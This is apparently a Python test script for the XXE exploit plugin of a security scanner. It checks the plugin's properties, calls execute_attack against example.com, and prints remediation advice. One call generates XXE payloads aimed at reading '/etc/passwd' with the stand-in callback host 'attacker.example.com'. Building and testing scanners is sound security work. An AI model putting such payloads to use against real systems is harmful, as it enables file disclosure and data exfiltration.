#!/usr/bin/env python3
"""
Test script for XXE plugin with visual proof capture
"""

import sys
import os

# Add scanner to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from scanner.plugins.exploits.xxe_plugin import XXEPlugin


def test_xxe_plugin_import():
    """Test that XXE plugin imports correctly with visual proof modules"""
    print("=" * 60)
    print("Testing XXE Plugin with Visual Proof Capabilities")
    print("=" * 60)
    
    try:
        plugin = XXEPlugin()
        print("\n✓ XXE Plugin instantiated successfully")
        
        # Test basic properties
        print(f"\n  Plugin Name: {plugin.name}")
        print(f"  Version: {plugin.version}")
        print(f"  Vulnerability Type: {plugin.vulnerability_type}")
        print(f"  Severity: {plugin.get_severity_level()}")
        
        # Check for visual proof support
        from scanner.plugins.exploits.xxe_plugin import HAS_VISUAL_PROOF
        print(f"\n  Visual Proof Support: {'✓ Available' if HAS_VISUAL_PROOF else '✗ Not Available'}")
        
        # Test method existence
        if hasattr(plugin, '_capture_visual_proof'):
            print("  ✓ _capture_visual_proof method exists")
        else:
            print("  ✗ _capture_visual_proof method NOT found")
            
        # Test payload generation
        print("\n" + "=" * 60)
        print("Testing Payload Generation")
        print("=" * 60)
        
        payloads = plugin.generate_payloads({
            'target_file': '/etc/passwd',
            'callback_server': 'attacker.example.com'
        })
        
        print(f"\n✓ Generated {len(payloads)} payloads")
        print("\nSample payload (first 200 chars):")
        if payloads:
            print(f"\n{payloads[0][:200]}...")
        
        # Test exploitation structure (without actually attacking)
        print("\n" + "=" * 60)
        print("Testing Execute Attack Structure")
        print("=" * 60)
        
        # This will fail because we're not providing a real target, but we can check the structure
        result = plugin.execute_attack(
            'http://example.com/test',
            {},
            {'capture_visual_proof': True}
        )
        
        print(f"\n  Result structure:")
        print(f"    - success: {result.get('success')}")
        print(f"    - vulnerability_type: {result.get('vulnerability_type')}")
        print(f"    - error: {result.get('error', 'N/A')}")
        
        # Test remediation advice
        print("\n" + "=" * 60)
        print("Remediation Advice")
        print("=" * 60)
        remediation = plugin.get_remediation_advice()
        print(f"\n{remediation[:300]}...")
        
        print("\n" + "=" * 60)
        print("✓ All Tests Passed!")
        print("=" * 60)
        
        return True
        
    except Exception as e:
        print(f"\n✗ Error: {e}")
        import traceback
        traceback.print_exc()
        return False


if __name__ == '__main__':
    success = test_xxe_plugin_import()
    sys.exit(0 if success else 1)
